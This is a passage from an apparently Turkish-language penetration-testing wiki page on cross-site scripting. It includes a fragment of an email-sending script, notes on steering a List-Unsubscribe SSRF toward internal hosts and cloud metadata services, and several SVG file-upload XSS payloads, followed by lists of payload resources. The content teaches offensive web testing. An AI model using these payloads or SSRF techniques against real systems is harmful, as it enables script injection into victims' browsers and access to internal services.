msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Test notları**

- Bir OAST endpoint'i kullanarak blind SSRF vuruşlarını toplayın, sonra yöntem doğrulandığında `List-Unsubscribe` URL'sini `http://127.0.0.1:PORT`, metadata servisleri veya diğer dahili host'lara hedefleyecek şekilde uyarlayın.
- Çünkü unsubscribe helper genellikle uygulama ile aynı HTTP yığınıni yeniden kullandığından, onun proxy settings, HTTP verbs ve header rewrites ayarlarını devralırsınız; bu da [SSRF methodology](../ssrf-server-side-request-forgery/README.md) bölümünde anlatılan ek traversal hilelerini mümkün kılar.

### XSS ile dosya yükleme (svg)

Aşağıdaki gibi bir dosyayı resim olarak yükleyin (kaynak: [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Daha fazla **SVG payloads için** bak: [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Diğer JS Hileleri ve İlgili Bilgiler


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS kaynakları

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Referanslar

- [Turning a harmless XSS behind a WAF into a realistic phishing vector](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS and SSRF via the List-Unsubscribe SMTP Header in Horde Webmail and Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne Report #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust becomes a script loader + backend JS concatenation enables supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS via manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
